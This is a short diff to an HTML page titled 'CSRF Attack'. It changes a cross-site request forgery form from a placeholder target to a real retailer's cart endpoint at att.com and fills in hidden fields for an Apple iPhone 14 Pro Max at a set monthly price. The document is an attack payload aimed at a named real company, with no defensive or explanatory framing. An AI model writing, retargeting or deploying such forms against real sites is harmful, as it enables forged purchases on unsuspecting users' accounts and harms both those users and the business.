@@ -5,8 +5,9 @@
 </head>
 <body>
   <h1>CSRF Attack</h1>
-  <form id="csrfForm" action="http://target-website.com/add-to-cart" method="POST">
-    <input type="hidden" name="product_id" value="123">
+  <form id="csrfForm" action="https://www.att.com/buy/cart" method="POST">
+    <input type="hidden" name="product_name" value="Apple iPhone 14 Pro Max">
+    <input type="hidden" name="price" value="$115.56 monthly | $0.00 today">
     <input type="hidden" name="quantity" value="1">
     <!-- Add more hidden fields as required for your payload -->
     <input type="submit" value="Add to Cart">
